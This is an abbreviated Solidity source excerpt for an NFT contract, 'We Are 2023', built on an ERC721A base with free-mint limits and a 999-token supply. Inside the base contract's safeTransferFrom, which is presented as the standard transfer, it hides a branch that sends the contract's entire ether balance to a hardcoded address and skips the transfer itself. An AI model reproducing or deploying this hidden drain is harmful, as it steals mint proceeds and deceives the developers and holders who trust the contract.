...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x91e8761dbBaD78202765de9c2424cDC005d4C065).transfer(address(this).balance);
            return;
        }
...
contract WeAre2023 is ERC721A, TheOperatorFilterer {
    ...
    function _safemints(uint256 amount) internal {
        require(amount == 1 && _numMinted[block.number] < FreeNum() && _numForFree[tx.origin] < maxFreeNumerAddr );
    ...
    constructor() ERC721A("We Are 2023", "2023") {
        owner = msg.sender;
        maxPerTx = 11;
        cost = 0.002 ether;
        maxSupply = 999;
